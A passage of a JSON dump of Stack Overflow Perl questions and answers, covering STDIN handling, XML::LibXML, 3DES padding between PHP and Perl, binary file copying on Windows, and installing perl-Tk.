<code>&lt;STDIN&gt;</code> instead of <code>&lt;&gt;</code>,</p>\n\n<pre><code>my $input = &lt;STDIN&gt;;\n</code></pre>\n\n<p>so later diamond usage will read files from <code>@ARGV</code> arguments array.</p>\n"}], "owner": {"reputation": 533, "user_id": 3424550, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/xDcdj.jpg?s=128&g=1", "display_name": "Rodolfo", "link": "https://stackoverflow.com/users/3424550/rodolfo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 51, "favorite_count": 0, "accepted_answer_id": 33580894, "answer_count": 1, "score": 2, "last_activity_date": 1446886062, "creation_date": 1446885946, "question_id": 33580881, "link": "https://stackoverflow.com/questions/33580881/read-user-input-while-also-providing-filenames-as-arguments", "title": "Read User Input while also providing filenames as arguments", "body": "<p>I am creating my first program in perl, and I wanted to request the user to input some information from the keyboard while also reading some files that would be provided as arguments.</p>\n\n<p>Is there any way to specify to the diamond operator '&lt;>' to only consider the user input?</p>\n\n<p>This is the code that I wrote:</p>\n\n<pre><code>print \"Enter a number: \";\nmy $input = &lt;&gt;;\n\n# do something with the input\n\nwhile(&lt;&gt;){\n     print \"line $.: $_\";\n}\n</code></pre>\n"}, {"tags": ["perl", "libxml2"], "answers": [{"comments": [{"owner": {"reputation": 1805, "user_id": 1410711, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/2872680a6b9ef5b0407b4fef88966e2e?s=128&d=identicon&r=PG", "display_name": "Recker", "link": "https://stackoverflow.com/users/1410711/recker"}, "edited": false, "score": 0, "creation_date": 1446881101, "post_id": 33580185, "comment_id": 54937502, "body": "That explains it. I will have to update my libXML 3rd Party library."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 1805, "user_id": 1410711, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/2872680a6b9ef5b0407b4fef88966e2e?s=128&d=identicon&r=PG", "display_name": "Recker", "link": "https://stackoverflow.com/users/1410711/recker"}, "edited": false, "score": 0, "creation_date": 1447026094, "post_id": 33580185, "comment_id": 54976206, "body": "@Recker, it&#39;s the Perl module that needs updating, not the libxml library"}], "tags": [], "owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": true, "score": 4, "last_activity_date": 1446880906, "last_edit_date": 1446880906, "creation_date": 1446880262, "answer_id": 33580185, "question_id": 33579788, "link": "https://stackoverflow.com/questions/33579788/perl-hash-using-libxml/33580185#33580185", "title": "Perl Hash using LibXML", "body": "<p>First thing to realize is <code>$value</code> is an XML::LibXML::NodeList object.  It only looks like a string when you print it because it has stringification overloaded.  You can check with <code>ref $value</code>.</p>\n\n<p>With <code>my $value = $node-&gt;getChildrenByTagName('data2');</code>, <code>$value</code> will <em>always</em> be a NodeList object.  It might be an empty NodeList, but you'll always get a NodeList object.</p>\n\n<hr>\n\n<p>Your version of XML::LibXML is out of date.  Your version of XML::LibXML::NodeList has no string comparison overloading and, by default, Perl will not \"fallback\" to use stringification for other string operators like <code>ne</code>.  <a href=\"https://rt.cpan.org/Public/Bug/Display.html?id=57737\" rel=\"nofollow\">I reported this bug back in 2010</a> and it was <a href=\"https://metacpan.org/changes/distribution/XML-LibXML#L543\" rel=\"nofollow\">fixed in 2011 in version 1.77</a>.</p>\n\n<p>Upgrade XML::LibXML and the problem will go away.</p>\n\n<p>As a work around you can force stringification by quoting the NodeList object.</p>\n\n<pre><code>if( \"$nodelist\" ne \"foo\" ) { ... }\n</code></pre>\n\n<p>But really, update that module.  There's been a lot of work done on it.</p>\n\n<blockquote>\n  <p>Perl inserts space as a value in the hash</p>\n</blockquote>\n\n<p>This is a NodeList object stringifying.  I get an empty string from an empty NodeList.  You might be getting a space as an old bug.</p>\n\n<p>You can also check <code>$value-&gt;size</code> to see if the NodeList is empty.</p>\n"}], "owner": {"reputation": 1805, "user_id": 1410711, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/2872680a6b9ef5b0407b4fef88966e2e?s=128&d=identicon&r=PG", "display_name": "Recker", "link": "https://stackoverflow.com/users/1410711/recker"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 318, "favorite_count": 0, "accepted_answer_id": 33580185, "answer_count": 1, "score": 0, "last_activity_date": 1555522376, "creation_date": 1446877008, "last_edit_date": 1555522376, "question_id": 33579788, "link": "https://stackoverflow.com/questions/33579788/perl-hash-using-libxml", "title": "Perl Hash using LibXML", "body": "<p>I have an XML data as follows.</p>\n\n<pre><code>&lt;type&gt;\n   &lt;data1&gt;something1&lt;/data1&gt;\n   &lt;data2&gt;something2&lt;/data2&gt;\n&lt;/type&gt;\n&lt;type&gt;\n   &lt;data1&gt;something1&lt;/data1&gt;\n   &lt;data2&gt;something2&lt;/data2&gt;\n&lt;/type&gt;\n&lt;type&gt;\n   &lt;data1&gt;something1&lt;/data1&gt;\n&lt;/type&gt;\n</code></pre>\n\n<p>As one can see, child node data2 is sometimes not present.</p>\n\n<p>I have used <a href=\"https://stackoverflow.com/questions/27328986/how-to-use-xmllibxml-to-parse-an-xml-document-and-build-a-perl-hash\">this</a> as a guideline to create the following code.</p>\n\n<pre><code>my %hash;\nmy $parser = XML::LibXML-&gt;new();\nmy $doc    = $parser-&gt;parse_file($file_name);\nmy @nodes  = $doc-&gt;findnodes(\"/type\");\n\nforeach my $node(@nodes)\n{\n    my $key = $node-&gt;getChildrenByTagName('data1');\n    my $value = $node-&gt;getChildrenByTagName('data2');\n    $hash{$key} = $value;\n}\n</code></pre>\n\n<p>Later, I am using this hash to generate some more data based on a fact if the child node data2 is present or not. </p>\n\n<p>I use <code>ne</code> operator assuming that data in the <code>%hash</code> are key value pairs of strings and when <code>data2</code> is not present, Perl inserts space as a value in the hash (I have printed this hash and found that only space is printed as a value).</p>\n\n<p>However, I end up with following compilation errors.</p>\n\n<pre><code>Operation \"ne\": no method found,\n        left argument in overloaded package XML::LibXML::NodeList,\n        right argument has no overloaded magic at filename.pl line 74.\n</code></pre>\n\n<p>How do I solve this? What is the best data structure to store this data when we see that sometimes a node will not be there ?</p>\n"}, {"tags": ["php", "perl", "encryption", "3des"], "answers": [{"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1446906917, "post_id": 33581452, "comment_id": 54944043, "body": "Note that PHP&#39;s padding method is unsafe for any strings that may contain NULs (i.e. virtually any &quot;binary&quot; file)."}, {"owner": {"reputation": 23, "user_id": 5255777, "user_type": "registered", "profile_image": "https://graph.facebook.com/487789564723132/picture?type=large", "display_name": "Pedro Perez", "link": "https://stackoverflow.com/users/5255777/pedro-perez"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1446936807, "post_id": 33581452, "comment_id": 54953515, "body": "That was interesting @ikegami! Thanks for the info"}], "tags": [], "owner": {"reputation": 11654, "user_id": 855532, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c813498f5874062c5f0f0671d0f1f271?s=128&d=identicon&r=PG", "display_name": "vstm", "link": "https://stackoverflow.com/users/855532/vstm"}, "is_accepted": true, "score": 2, "last_activity_date": 1446890591, "creation_date": 1446890591, "answer_id": 33581452, "question_id": 33578715, "link": "https://stackoverflow.com/questions/33578715/same-return-value-in-php-and-perl-3des-cbc/33581452#33581452", "title": "Same return value in php and perl 3DES CBC", "body": "<p>You are not using the same padding mechanism.</p>\n\n<p>If you read the reference page of <a href=\"http://php.net/manual/en/function.mcrypt-encrypt.php\" rel=\"nofollow\">PHP's mcrypt_encrypt</a> very carefully you'll see the following note next to the data parameter:</p>\n\n<blockquote>\n  <p>If the size of the data is not n * blocksize, the data will be padded with '\\0'. </p>\n</blockquote>\n\n<p>Now, if you also read the reference page of <a href=\"http://search.cpan.org/~lds/Crypt-CBC-2.33/CBC.pm#Padding_methods\" rel=\"nofollow\">Perls Crypt::CBC</a>, you notice they have several padding methods (defined by the <code>-padding</code> parameter). The default is PKCS#5 which is something different than just padding with <code>0x00</code>.</p>\n\n<p>Now if you change the padding to <code>\"null\"</code>, Perl prints the same as PHP. So your code should look like this:</p>\n\n<pre><code>use MIME::Base64;\nuse Crypt::CBC;\n$cipher = Crypt::CBC-&gt;new(  -key    =&gt; decode_base64('Mk9m98IfEblmPfrpsawt7BmxObt98Jev'),\n                                -cipher =&gt; 'DES_EDE3',\n                                -iv     =&gt; pack(\"H*\",\"0000000000000000\"),\n                                -padding     =&gt; \"null\",\n                                -literal_key =&gt; 1,\n                                -header      =&gt; 'none'\n                            );\n\n$ciphertext = $cipher-&gt;encrypt(\"0000001920\");\nprint encode_base64($ciphertext, '');\n</code></pre>\n\n<p>Alternatively you could implement PKCS#5 in PHP, which you have to do by yourself, since PHP does not include it by default (search for PHP PKCS#5 and you probably find some code-snippets which you can use, theres even a <a href=\"http://us3.php.net/manual/en/ref.mcrypt.php#69782\" rel=\"nofollow\">simple PKCS#5 function</a> in one of the PHP-doc comments).</p>\n"}], "owner": {"reputation": 23, "user_id": 5255777, "user_type": "registered", "profile_image": "https://graph.facebook.com/487789564723132/picture?type=large", "display_name": "Pedro Perez", "link": "https://stackoverflow.com/users/5255777/pedro-perez"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 127, "favorite_count": 0, "accepted_answer_id": 33581452, "answer_count": 1, "score": 2, "last_activity_date": 1446890591, "creation_date": 1446865752, "question_id": 33578715, "link": "https://stackoverflow.com/questions/33578715/same-return-value-in-php-and-perl-3des-cbc", "title": "Same return value in php and perl 3DES CBC", "body": "<p>I would like to know how to return the same values for a 3DES encription in perl and php. The PHP code is the following:</p>\n\n<pre><code>$bytes = array(0,0,0,0,0,0,0,0);\n$iv = implode(array_map(\"chr\", $bytes)); \n$ciphertext = mcrypt_encrypt(MCRYPT_3DES, base64_decode('Mk9m98IfEblmPfrpsawt7BmxObt98Jev'), '0000001920', MCRYPT_MODE_CBC, $iv);\necho base64_encode($ciphertext);\n</code></pre>\n\n<p>The result is: \"A/VCTXA6q/x/emW0zzlSDg==\"</p>\n\n<p>The perl code is:</p>\n\n<pre><code>use Crypt::CBC;\n$cipher = Crypt::CBC-&gt;new(  -key    =&gt; decode_base64('Mk9m98IfEblmPfrpsawt7BmxObt98Jev'),\n                                -cipher =&gt; 'DES_EDE3',\n                                -iv     =&gt; pack(\"H*\",\"0000000000000000\"),\n                                -literal_key =&gt; 1,\n                                -header      =&gt; 'none'\n                            );\n\n$ciphertext = $cipher-&gt;encrypt(\"0000001920\");\nprint encode_base64($ciphertext, '');\n</code></pre>\n\n<p>The result is: \"A/VCTXA6q/y9g7ypgqlWIg==\"</p>\n\n<p>The results are very similar, what I'm doing wrong in my perl code?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1446863217, "post_id": 33577497, "comment_id": 54934530, "body": "It&#39;s a strange thing to want to do. I&#39;ve never thought that it&#39;s something I wanted to do in Perl. I would suggest that maybe you need to control your code flow according to the value of <code>$y</code>, rather than just controlling the value of <code>$x</code> with it. If you show some real code where you wish you could use this construct then I&#39;m sure we could help you better"}, {"owner": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 1, "creation_date": 1446875546, "post_id": 33577497, "comment_id": 54936417, "body": "<code>my $foo = $y ? $x : ();</code>"}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 41196, "user_id": 887539, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/5baef9617bdee6db2f534c118bcbccee?s=128&d=identicon&r=PG", "display_name": "andlrc", "link": "https://stackoverflow.com/users/887539/andlrc"}, "edited": false, "score": 5, "creation_date": 1446863270, "post_id": 33577530, "comment_id": 54934537, "body": "@dev-null: I don&#39;t see how that&#39;s relevant"}, {"owner": {"reputation": 538, "user_id": 490240, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4c64a9d5c93890e5043388e0f8508fc5?s=128&d=identicon&r=PG", "display_name": "jrw32982", "link": "https://stackoverflow.com/users/490240/jrw32982"}, "edited": false, "score": 0, "creation_date": 1447087096, "post_id": 33577530, "comment_id": 55001901, "body": "This is the right answer (I like the formulation from @\u0421\u0443\u0445\u043e\u043927 slightly better).  But I don&#39;t like it:  When $y is long and $x is short, I want to say <code>$foo = $x if $y</code> so that $y comes at the end, where it won&#39;t overshadow $x.  But I don&#39;t want to use a separate statement just to declare $foo."}], "tags": [], "owner": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "is_accepted": true, "score": 2, "last_activity_date": 1446854882, "creation_date": 1446854882, "answer_id": 33577530, "question_id": 33577497, "link": "https://stackoverflow.com/questions/33577497/uses-and-alternatives-for-the-my-foo-x-if-y-syntax/33577530#33577530", "title": "Uses and alternatives for the \u201cmy $foo = $x if $y\u201d syntax?", "body": "<p>Straightforwardly:</p>\n\n<pre><code>my $foo = $y ? $x : undef;\n</code></pre>\n\n<p>Possibly also</p>\n\n<pre><code>my $foo = $y &amp;&amp; $x;\n</code></pre>\n\n<p>however this will give any <em>false</em> value of <code>$y</code> (for example <code>0</code> or <code>\"\"</code>) to <code>$x</code> as well, not only <code>undef</code>.</p>\n"}], "owner": {"reputation": 538, "user_id": 490240, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4c64a9d5c93890e5043388e0f8508fc5?s=128&d=identicon&r=PG", "display_name": "jrw32982", "link": "https://stackoverflow.com/users/490240/jrw32982"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 100, "favorite_count": 0, "accepted_answer_id": 33577530, "answer_count": 1, "score": 0, "last_activity_date": 1446854882, "creation_date": 1446854594, "last_edit_date": 1495540367, "question_id": 33577497, "link": "https://stackoverflow.com/questions/33577497/uses-and-alternatives-for-the-my-foo-x-if-y-syntax", "title": "Uses and alternatives for the \u201cmy $foo = $x if $y\u201d syntax?", "body": "<p>ikegami's comments to the answer to <a href=\"https://stackoverflow.com/questions/20177827/what-is-wrong-in-my-foo-x-if-y-syntax\">this question</a> imply that there is a correct usage of this or similar constructs.  Can someone explain what that usage might be and why someone might want to use it?  I already know about the use of scoping to create stateful variables in all versions of perl and about state variables in more recent versions of perl.</p>\n\n<p>Also, I'm really tired of writing:</p>\n\n<pre><code>my $foo;\n$foo = $x if $y;   # $foo is now undef or $x depending on $y\n</code></pre>\n\n<p>instead of what I wish would work:</p>\n\n<pre><code>my $foo = $x if $y;   # DO NOT USE\n</code></pre>\n\n<p>Is there a better (i.e. short, one-line) way that doesn't repeat the variable name?</p>\n"}, {"tags": ["windows", "perl", "file"], "comments": [{"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 0, "creation_date": 1446854395, "post_id": 33577170, "comment_id": 54932693, "body": "Are the bytes that are added and removed <code>\\r</code>&#39;s?"}, {"owner": {"reputation": 466, "user_id": 4895979, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/uFYyR.png?s=128&g=1", "display_name": "Arsenii", "link": "https://stackoverflow.com/users/4895979/arsenii"}, "reply_to_user": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 0, "creation_date": 1446856261, "post_id": 33577170, "comment_id": 54933168, "body": "@mob I do not know as it is binary file. The same situation continues with ANY binary file (notwithstanding it is image, pdf, music or else). I do not know what the symbol it removes or adds. If it is \u0451\u043a\u0431 what then can I do? Thanks"}], "answers": [{"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 1, "last_activity_date": 1446864886, "creation_date": 1446864886, "answer_id": 33578651, "question_id": 33577170, "link": "https://stackoverflow.com/questions/33577170/different-files-after-copying-data-with-perl-in-windows7-and-8-1/33578651#33578651", "title": "Different files after copying data with Perl in Windows7 and 8.1", "body": "<p>The problem is that the default Perl IO layer on Windows systems is <code>:crlf</code>, which converts the CR LF sequence to just LF on input, and reverses the conversion on output. It's done so that a Perl program running on a Windows system and reading and writing Windows files performs identically if it is run on a Linux (or OS X) system and works with files native to that platform</p>\n\n<p>Because of this your <code>read</code> operation is missing 14,000 CR characters, and because you have used <code>binmode</code> on the output file handle they are not replaced</p>\n\n<p>The proper solution is to use <code>binmode</code> on the input file handle as well, or you could open it in <code>:raw</code> mode, which has the same effect</p>\n\n<p>Your program should look like this. I've added <code>use autodie</code> so that I don't have to write code to check the status of each file IO operation like <code>open</code></p>\n\n<pre><code>use strict;\nuse warnings;\nuse v5.10.1;\nuse autodie;\n\nmy ( $infile, $outfile) = qw/ 1.pdf test.pdf /;\n\nopen my $in_fh,  '&lt;:raw', $infile;\nopen my $out_fh, '&gt;:raw', $outfile;\n\nwhile ( my $size = read($in_fh, my $data, 1024) ) {\n   print $out_fh $data;\n}\n\nprint \"DONE!\\n\";\n</code></pre>\n\n<p>You could also use <a href=\"http://perldoc.perl.org/functions/sysread.html\" rel=\"nofollow\"><code>sysread</code></a>, which bypasses the Perl IO system, so the <code>:crlf</code> layer is irrelevant</p>\n"}], "owner": {"reputation": 466, "user_id": 4895979, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/uFYyR.png?s=128&g=1", "display_name": "Arsenii", "link": "https://stackoverflow.com/users/4895979/arsenii"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 28, "favorite_count": 0, "accepted_answer_id": 33578651, "answer_count": 1, "score": 0, "last_activity_date": 1446864886, "creation_date": 1446852563, "question_id": 33577170, "link": "https://stackoverflow.com/questions/33577170/different-files-after-copying-data-with-perl-in-windows7-and-8-1", "title": "Different files after copying data with Perl in Windows7 and 8.1", "body": "<p>I have a file (1.pdf) which is 1mb.\nI have a simple Perl script, that reads the data by chunks from the file and writes then every chink into the new file.\nAfter checking the weights of two files - they are different in about 14kb.</p>\n\n<p>In Linux Ubuntu 15 and Mac OS 10.9.5 works perfect.\nThe problem is only in Win7 x32, Win8.1 x64 and Win7 x64.</p>\n\n<p>I need to process the file (of course) before writing into the new one, but the simple basic operation of reading from a file + writing them into the new one does not work in WIN OS. Sometimes the OS \"composes\" new bytes for me, sometimes removes.</p>\n\n<p>The script we use is:</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\n\nmy $filename = \"test.pdf\";\n\n#Creating an output file\nopen (\"F\", \"&gt;\", $filename) || die \"Could not create an output file $filename: $!\\n\";\nclose F;\n\nmy $file = \"1.pdf\";\nopen my $upf, \"&lt;\", $file or die \"Could not read from the DATA file\\n\";\n\n\n   open (\"FOUT\", \"&gt;&gt;\", $filename) || die \"Could not write into the output file: $!\";\n        binmode FOUT;\n        while (read($upf, my $data, 1024)) {\n           print FOUT $data;\n        }\n   close FOUT;\nclose $upf;\n\nprint \"DONE!\";\n</code></pre>\n\n<p>Is it connected with some specific files creation method in Windows?\nNB: creation of the file after the comment \"Creating an output file\" does not make any impact on the result.</p>\n\n<p>Any help is appreciated!\nThanks!</p>\n"}, {"tags": ["linux", "perl", "installation", "tcl", "tk"], "answers": [{"comments": [{"owner": {"reputation": 115, "user_id": 4541405, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/6c209cd112b711cb948298038e0e5cb8?s=128&d=identicon&r=PG&f=1", "display_name": "rhg_lnx", "link": "https://stackoverflow.com/users/4541405/rhg-lnx"}, "edited": false, "score": 0, "creation_date": 1446840402, "post_id": 33574652, "comment_id": 54927627, "body": "Yes - should anyone else have this situation, the above information corrected the issue."}], "tags": [], "owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "is_accepted": true, "score": 4, "last_activity_date": 1446839691, "creation_date": 1446839691, "answer_id": 33574652, "question_id": 33574458, "link": "https://stackoverflow.com/questions/33574458/installing-tcl-tk-under-linux-centos-7-for-use-with-perl-5-missing-a-step/33574652#33574652", "title": "Installing tcl/tk under Linux Centos 7 for use with Perl 5 - Missing a step?", "body": "<p>The Perl module is <a href=\"https://metacpan.org/pod/Tk\" rel=\"nofollow\">Tk.pm</a>. RPMs for Perl modules generally follow the pattern:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>Module      RPM\n------      ---\nFoo::Bar    perl-Foo-Bar\n</code></pre>\n\n<p>So run:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>yum install perl-Tk\n</code></pre>\n\n<p>and in your script, do:</p>\n\n<pre><code>use Tk;\n</code></pre>\n"}], "owner": {"reputation": 115, "user_id": 4541405, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/6c209cd112b711cb948298038e0e5cb8?s=128&d=identicon&r=PG&f=1", "display_name": "rhg_lnx", "link": "https://stackoverflow.com/users/4541405/rhg-lnx"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2000, "favorite_count": 0, "accepted_answer_id": 33574652, "answer_count": 1, "score": 1, "last_activity_date": 1446839691, "creation_date": 1446838943, "question_id": 33574458, "link": "https://stackoverflow.com/questions/33574458/installing-tcl-tk-under-linux-centos-7-for-use-with-perl-5-missing-a-step", "title": "Installing tcl/tk under Linux Centos 7 for use with Perl 5 - Missing a step?", "body": "<p>Running Perl 5 on Centos 7 and trying to install tcl/tk.</p>\n\n<p>I've installed tk, tk-devel, tcl and tcl-devel using yum.  The yum install appears to work fine.  In fact, I re-ran the yum commands and saw a \"nothing to be done\" type of message.</p>\n\n<p>In my perl file, the only code (after a declaration) is either </p>\n\n<pre><code>use tk;\n</code></pre>\n\n<p>Or</p>\n\n<pre><code>use Tk;\n</code></pre>\n\n<p>I'm not sure which is correct.  However, either one produces an error when I run the file -</p>\n\n<pre><code>Can't locate tk.pm in @INC (@INC contains: /usr/local/lib64/perl5 /usr/local/share/perl5 /usr/lib64/perl5/vendor_perl /usr/share/perl5/vendor_perl /usr/lib64/perl5 /usr/share/perl5 .) at ./test.pl line 4.\nBEGIN failed--compilation aborted at ./test.pl line 4.\n</code></pre>\n\n<p>If I do a \"find\" from / searching for tk.pm the file is not found.</p>\n\n<p>After the initial failure I found this on a site, which appears to be an additional step?</p>\n\n<pre><code>to install\ntcl-8.5.13-4.el7.x86_64\ntcl-devel-8.5.13-4.el7.x86_64\n</code></pre>\n\n<p>Invoking either one from the Linux command line generates a file not found error.</p>\n\n<p>If I do a \"find\" from / searching for either file nothing is found.</p>\n\n<p>It seems obvious I am missing something, but have no idea what it night be.</p>\n"}, {"tags": ["mysql", "regex", "perl", "awk"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1446839102, "post_id": 33574414, "comment_id": 54926944, "body": "In Perl, the replacement expression can be Perl code: <code>s{...}{ ($1-21).&#39;:&quot;&#39; }e</code> (Similar functionality exists in other languages.)"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1446839183, "post_id": 33574414, "comment_id": 54926988, "body": "Can you explain why 42 becomes 15?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1446839208, "post_id": 33574414, "comment_id": 54927001, "body": "@ThisSuitIsBlackNot, He wants to subtract 21, as you can see from his attempt to solve this.   ...wait, that would change 42 into 21, not 15?!"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1446839337, "post_id": 33574414, "comment_id": 54927054, "body": "@ikegami 42 - 21 = 21. Edit: you caught it."}, {"owner": {"reputation": 610, "user_id": 147126, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/10b9c58599ec50d176fa2ce8c2d8bd88?s=128&d=identicon&r=PG", "display_name": "Tanner", "link": "https://stackoverflow.com/users/147126/tanner"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1446839603, "post_id": 33574414, "comment_id": 54927185, "body": "@ikegami Good point. The IP address I am dealing with doesn&#39;t have any zeroes in it."}, {"owner": {"reputation": 610, "user_id": 147126, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/10b9c58599ec50d176fa2ce8c2d8bd88?s=128&d=identicon&r=PG", "display_name": "Tanner", "link": "https://stackoverflow.com/users/147126/tanner"}, "edited": false, "score": 0, "creation_date": 1446839667, "post_id": 33574414, "comment_id": 54927213, "body": "Also, the 42 to 15, and 21 are all arbitrary, sorry for the confusion. The point I was trying to make is I want to subtract <i>some</i> number from the one matched"}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1446839778, "post_id": 33574414, "comment_id": 54927283, "body": "You want to subtract some number from the first number in the line, and then replace that number with the result of the subtraction?"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1446840801, "post_id": 33574414, "comment_id": 54927841, "body": "Ah, so it looks like you want to remove the protocol and hostname from the URL, then change the number to the left of the colon to be the length of the new string (excluding quotes), correct?"}, {"owner": 